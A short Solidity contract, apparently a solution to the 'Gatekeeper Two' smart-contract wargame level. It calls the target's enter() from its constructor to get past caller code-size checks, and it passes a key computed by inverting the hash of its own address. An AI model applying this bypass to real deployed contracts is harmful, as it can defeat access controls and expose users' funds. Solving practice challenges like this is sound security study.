// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperTwo{
  function enter(bytes8) external returns(bool);
}
contract GatekeeperEnter {
  constructor(address _gatekeeperImpl) public {
    bytes8 aux = ~bytes8(keccak256(abi.encodePacked(address(this))));
    IGatekeeperTwo instance = IGatekeeperTwo(_gatekeeperImpl);
    instance.enter(aux);
  }

}